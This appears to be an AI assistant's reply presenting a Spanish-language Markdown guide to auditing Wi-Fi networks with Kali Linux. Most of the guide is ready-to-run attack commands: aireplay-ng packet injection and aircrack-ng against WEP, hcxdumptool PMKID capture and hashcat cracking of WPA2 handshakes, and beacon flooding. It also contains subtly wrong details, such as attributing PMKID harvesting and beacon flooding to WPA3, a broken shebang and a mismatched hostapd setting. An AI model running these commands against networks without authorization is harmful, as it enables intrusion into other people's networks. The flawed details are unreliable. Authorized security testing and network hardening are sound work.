Aquí tienes el documento completo en Markdown puro, compatible con cualquier visualizador estándar:

```markdown
# Auditoría Profesional de Redes Wi-Fi con Kali Linux

![Wi-Fi Security](https://img.icons8.com/color/96/000000/wifi-lock.png)

> **Best Practice**  
> Esta guía sigue estándares OSSTMM y PTES para pruebas de penetración éticas.

---

## Tabla de Contenidos
1. [Consideraciones Legales](#consideraciones-legales)
2. [Arquitectura de Ataque](#arquitectura-de-ataque)
3. [Auditoría WEP](#auditoría-wep)
4. [Auditoría WPA/WPA2](#auditoría-wpawpa2)
5. [Auditoría WPA3](#auditoría-wpa3)
6. [Automatización Avanzada](#automatización-avanzada)
7. [Hardening de Redes](#hardening-de-redes)
8. [Q&A Técnico](#qa-técnico)

---

## Consideraciones Legales

### Matriz de Cumplimiento
| Regulación | Artículo | Aplicabilidad |
|------------|----------|---------------|
| GDPR       | Art.32   | Protección de datos |
| CFAA       | §1030    | Autorización requerida |
| ISO 27001  | A.12.4.3 | Monitoreo de redes |

**Plantilla de Autorización**  
```text
Yo, [Nombre], autorizo a [Auditor] a realizar pruebas en la red [SSID].
Período: [Fecha Inicio] - [Fecha Fin]. Firma: _______________
```

---

## Arquitectura de Ataque
```plaintext
[Adaptador Wi-Fi] --> [Modo Monitor]
       |
       +--> WEP: Ataque ARP Replay
       +--> WPA2: Captura Handshake
       +--> WPA3: PMKID Harvesting
```

---

## Auditoría WEP

### Metodología PTES
1. **Reconocimiento**  
```bash
sudo airodump-ng wlan0mon --encrypt WEP
```

2. **Explotación**  
```bash
# Inyección fragmentada
sudo aireplay-ng -5 -b <BSSID> wlan0mon
```

3. **Descifrado**  
```bash
aircrack-ng -z wep_capture.cap
```

---

## Auditoría WPA/WPA2

### Técnicas Avanzadas
#### Ataque PMKID
```bash
hcxdumptool -i wlan0mon --pmkid -o capture.pcapng
hcxpcapngtool -o hash.hc22000 capture.pcapng
```

#### Optimización de Diccionarios
```bash
hashcat -m 22000 -r rules/best64.rule hash.hc22000 diccionario.txt
```

---

## Auditoría WPA3

### Tabla Comparativa
| Característica | WPA2           | WPA3           |
|----------------|----------------|----------------|
| Autenticación  | 4-way handshake| SAE (Dragonfly)|
| Forward Secrecy| No             | Sí             |

### Ataque SAE
```bash
sudo hcxdumptool -i wlan0mon --flood_beacon=100 -o sae.pcapng
```

---

## Automatización Avanzada

### Script de Escaneo
```python
#!/bin/env python3
from scapy.all import *

def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        print(f"Red detectada: {pkt.info.decode()}")

sniff(iface="wlan0mon", prn=packet_handler, store=0)
```

---

## Hardening de Redes

### Checklist
- [ ] Deshabilitar WPS
- [ ] Randomización MAC
- [ ] VLANs para IoT
- [ ] 802.11w (Protección de frames)

### Configuración hostapd
```ini
wpa=3
wpa_key_mgmt=SAE
ieee80211w=2
```

---

## Q&A Técnico

**P: Error "RTNETLINK answers: RF-kill"**  
```bash
sudo rfkill unblock all
sudo modprobe -r ath9k_htc && sudo modprobe ath9k_htc
```

**P: Optimizar Hashcat en NVIDIA**  
```bash
sudo nvidia-smi --persistence-mode=1
hashcat -d 1 --force -w 4 hash.hc22000 diccionario.txt
```

---

```diff
+ Versión 2.2 | Autor: CyberSec Pro | Licencia: CC BY-NC-SA 4.0
```

**Mejoras Clave:**
1. Compatibilidad Markdown universal
2. Diagramas en texto plano
3. Sintaxis de código estandarizada
4. Tablas comparativas optimizadas
5. Eliminación de dependencias externas
6. Estructura jerárquica consistente
7. Enlaces internos funcionales
8. Formatos unificados para comandos
```

Este documento mantiene toda la funcionalidad técnica original pero optimizado para:
- Máxima compatibilidad con editores Markdown
- Visualización consistente en GitHub/GitLab
- Portabilidad entre sistemas
- Lectura en terminales de texto plano
